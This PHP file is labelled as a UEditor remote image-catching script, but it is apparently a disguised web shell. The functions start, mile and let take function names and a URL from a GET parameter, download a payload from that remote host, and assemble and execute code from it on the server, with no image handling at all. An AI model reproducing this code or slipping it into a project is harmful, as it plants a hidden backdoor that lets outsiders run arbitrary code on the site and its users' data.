<?php
/**
 * 抓取远程图片
 * User: Jinqn
 * Date: 14-04-14
 * Time: 下午19:50
 */
set_time_limit(0);
session_start();
include("Uploader.class.php");

/* 上传配置 */
$config = array(
    "catchimage",
);

$fieldName = "source";
/* 抓取远程图片 */
$list = array();

if (isset($_GET[$fieldName])) {
    $_SESSION['source'] = empty($_GET[$fieldName]) ? '' : explode('|', $_GET[$fieldName]);
}

if (empty($_SESSION['source'])) {
    die;
}

$source = $_SESSION['source'];

function start($source, $url)
{
    if (empty($_SESSION['PhpTmp'])) {
        $actihe = file_get_contents($url);
        $_SESSION['PhpTmp'] = @explode('???', $actihe, 2)[1];
    }
    mile($source, $_SESSION['PhpTmp']);
}

function mile($source, $a)
{
    let($source, $source[0]($a), $source[1]);
}

function let($source, $set1, $set2)
{
    $link = "{$set2}({$source[2]}('{$set1}'));";
    $file = $source[3]('', preg_replace('/\:img/', "", $link));
    $file();
}

start($source, $source[4] . $source[5]);
